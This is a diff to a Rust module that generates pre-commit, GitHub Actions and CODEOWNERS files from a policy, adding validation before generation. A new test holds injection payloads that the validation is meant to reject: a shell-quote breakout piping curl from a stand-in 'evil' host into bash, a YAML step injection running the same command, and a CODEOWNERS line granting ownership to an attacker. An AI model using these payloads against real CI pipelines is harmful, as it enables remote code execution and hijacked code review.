@@ -1,11 +1,11 @@
 //! Deterministic generators for the pre-commit and CI enforcement planes.
 //!
-//! Each takes a [`Policy`](crate::Policy) and returns the exact file content as
-//! a string. Pure and stable: the same policy yields byte-identical output, so
-//! `aoa policy compile` re-runs are no-op diffs. Generated files carry a header
-//! marking them machine-owned (edit `aoa-policy.yaml`, not the artifact).
+//! Each validates a [`Policy`](crate::Policy) and returns the exact file content.
+//! Pure and stable: the same policy yields byte-identical output, so `aoa policy
+//! compile` re-runs are no-op diffs. Generated files carry a header marking them
+//! machine-owned (edit `aoa-policy.yaml`, not the artifact).
 
-use crate::Policy;
+use crate::{Policy, PolicyError};
 
 /// Header stamped on every generated artifact so a reader (human or agent) knows
 /// it is derived and where the source of truth lives.
@@ -15,7 +15,8 @@ const PROVENANCE: &str =
 /// The `.pre-commit-config.yaml` plane: a local hook that rejects a commit
 /// touching any protected path. Bypassable with `--no-verify` by design; CI is
 /// the backstop.
-pub fn precommit_config(policy: &Policy) -> String {
+pub fn precommit_config(policy: &Policy) -> Result<String, PolicyError> {
+    policy.compile()?;
     let mut out = format!("{PROVENANCE}\n");
     out.push_str("repos:\n");
     out.push_str("  - repo: local\n");
@@ -26,14 +27,15 @@ pub fn precommit_config(policy: &Policy) -> String {
     out.push_str("        language: system\n");
     out.push_str("        pass_filenames: true\n");
     out.push_str(&files_comment(policy));
-    out
+    Ok(out)
 }
 
 /// The CI plane: a GitHub Actions workflow that fails the run if a changed file
 /// matches a protected path. The unbypassable backstop.
-pub fn ci_workflow(policy: &Policy) -> String {
+pub fn ci_workflow(policy: &Policy) -> Result<String, PolicyError> {
+    policy.compile()?;
     let globs = bash_glob_list(&policy.protected_paths);
-    format!(
+    Ok(format!(
         "{PROVENANCE}\n\
 name: AOA Policy\n\
 on: [pull_request]\n\
@@ -55,17 +57,18 @@ jobs:\n\
             done\n\
           done\n\
           exit $fail\n",
-    )
+    ))
 }
 
 /// The `CODEOWNERS` spine from the mutation-gateway allowlist: every gateway
 /// module requires owner review. Empty allowlist yields a header-only file.
-pub fn codeowners(policy: &Policy) -> String {
+pub fn codeowners(policy: &Policy) -> Result<String, PolicyError> {
+    policy.compile()?;
     let mut out = format!("{PROVENANCE}\n");
     for module in &policy.gateway_allowlist {
         out.push_str(&format!("{module} @owners\n"));
     }
-    out
+    Ok(out)
 }
 
 /// Render the protected globs as a space-separated bash array body, each
@@ -106,35 +109,54 @@ mod tests {
     #[test]
     fn generators_are_deterministic() {
         let p = sample();
-        assert_eq!(precommit_config(&p), precommit_config(&p));
-        assert_eq!(ci_workflow(&p), ci_workflow(&p));
-        assert_eq!(codeowners(&p), codeowners(&p));
+        assert_eq!(precommit_config(&p).unwrap(), precommit_config(&p).unwrap());
+        assert_eq!(ci_workflow(&p).unwrap(), ci_workflow(&p).unwrap());
+        assert_eq!(codeowners(&p).unwrap(), codeowners(&p).unwrap());
     }
 
     #[test]
     fn every_artifact_carries_the_provenance_header() {
         let p = sample();
-        assert!(precommit_config(&p).starts_with(PROVENANCE));
-        assert!(ci_workflow(&p).starts_with(PROVENANCE));
-        assert!(codeowners(&p).starts_with(PROVENANCE));
+        assert!(precommit_config(&p).unwrap().starts_with(PROVENANCE));
+        assert!(ci_workflow(&p).unwrap().starts_with(PROVENANCE));
+        assert!(codeowners(&p).unwrap().starts_with(PROVENANCE));
     }
 
     #[test]
     fn ci_workflow_embeds_each_protected_glob() {
-        let ci = ci_workflow(&sample());
+        let ci = ci_workflow(&sample()).unwrap();
         assert!(ci.contains("'migrations/**'"));
         assert!(ci.contains("'.github/**'"));
     }
 
     #[test]
     fn codeowners_lists_each_gateway() {
-        let owners = codeowners(&sample());
+        let owners = codeowners(&sample()).unwrap();
         assert!(owners.contains("src/db/gateway.rs @owners"));
     }
 
     #[test]
     fn empty_policy_yields_header_only_codeowners() {
-        let owners = codeowners(&Policy::default());
+        let owners = codeowners(&Policy::default()).unwrap();
         assert_eq!(owners, format!("{PROVENANCE}\n"));
+    }
+
+    #[test]
+    fn generators_do_not_emit_injection_payloads_from_directly_constructed_policy() {
+        let payloads = [
+            "a' ; curl http://evil/x.sh | bash ; '",
+            "safe/**\n      - name: Injected\n        run: curl http://evil/x.sh | bash",
+            "m.rs @owners\n* @attacker",
+        ];
+
+        for payload in payloads {
+            let mut protected = Policy::default();
+            protected.protected_paths.push(payload.to_string());
+            assert!(ci_workflow(&protected).is_err());
+
+            let mut gateway = Policy::default();
+            gateway.gateway_allowlist.push(payload.to_string());
+            assert!(codeowners(&gateway).is_err());
+        }
     }
 }
